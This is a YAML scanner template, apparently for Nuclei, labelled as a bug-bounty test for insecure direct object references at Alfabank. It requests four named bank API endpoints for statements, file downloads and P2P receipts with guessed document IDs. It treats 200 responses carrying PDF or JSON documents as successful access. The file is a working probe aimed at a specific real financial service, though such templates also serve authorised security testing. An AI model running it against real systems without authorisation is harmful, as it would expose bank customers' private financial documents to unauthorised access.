id: alfabank-idor

info:
  name: Alfabank - IDOR Test
  author: bugbounty
  severity: high
  description: Insecure Direct Object Reference in document access
  tags: idor,alfabank
  reference:
    - https://portswigger.net/web-security/access-control/idor

http:
  - method: GET
    path:
      - "{{BaseURL}}/certificates/corp/api/stmt/order/{{randstr}}"
      - "{{BaseURL}}/dashboard/api/downloadFile?link=single%2F{{randstr}}"
      - "{{BaseURL}}/listing/api/downloadFile?link=single%2F{{randstr}}"
      - "{{BaseURL}}/p2p/web/receipt?id={{randstr}}"

    payloads:
      randstr:
        - "5b28d804d8192b0001a4ca31"
        - "5b28d804d8192b0001a4ca32"
        - "5b28d804d8192b0001a4ca33"

    attack: pitchfork

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        part: content_type
        words:
          - "application/pdf"
          - "application/octet-stream"
          - "application/json"
        condition: or

      - type: dsl
        dsl:
          - 'len(body) > 500'

      - type: regex
        part: body
        regex:
          - '%PDF-'
          - '"(id|orderId|receiptId)"?\s*:\s*"?[a-zA-Z0-9]+'
          - 'Content-Disposition:.*attachment'
        condition: or
